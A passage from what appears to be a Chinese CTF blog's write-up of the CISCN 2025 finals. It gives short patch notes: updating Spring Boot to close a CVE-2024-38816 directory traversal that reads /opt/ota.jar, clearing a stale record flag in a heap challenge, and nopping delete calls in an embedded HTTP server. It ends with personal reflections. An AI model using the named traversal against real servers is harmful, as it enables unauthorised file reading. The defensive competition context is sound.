<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Springboot 3.3.3</p>
<p>看群u说直接更新springboot包就行了，有 CVE-2024-38816 打目录穿越读取 &#x2F;opt&#x2F;ota.jar</p>
<hr>
<h2 id="pwn-DarkHeap"><a href="#pwn-DarkHeap" class="headerlink" title="pwn-DarkHeap"></a>pwn-DarkHeap</h2><h3 id="fix-3"><a href="#fix-3" class="headerlink" title="fix"></a>fix</h3><p>删除记录后没有给记录存在的标志置零，手动添一下就好。</p>
<p><img src="/blog/2025/07/21/CISCN-2025-Final/f4b5c04f-1aad-4af6-800e-7ff881c2605f.png"></p>
<h2 id="pwn-embbed-httpd"><a href="#pwn-embbed-httpd" class="headerlink" title="pwn-embbed_httpd"></a>pwn-embbed_httpd</h2><h3 id="fix-4"><a href="#fix-4" class="headerlink" title="fix"></a>fix</h3><p>高松灯预测， delete 有问题（</p>
<p>把vohttpd_loop()里对socketdata_delete()的调用全部nop掉就过了。</p>
<p><img src="/blog/2025/07/21/CISCN-2025-Final/ee002968-5d69-4437-9c4f-4387572cb6fa.png"></p>
<hr>
<h1 id="Thinking"><a href="#Thinking" class="headerlink" title="Thinking"></a>Thinking</h1><p>今年和去年的队伍阵容相比带了俩吉祥物，本来觉得国二都困难的，没想到还能和去年名次一样</p>
<p>最近也是在上班当牛马没怎么研究ctf，这个部分晚点再补上吧，感慨的话还挺多的</p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>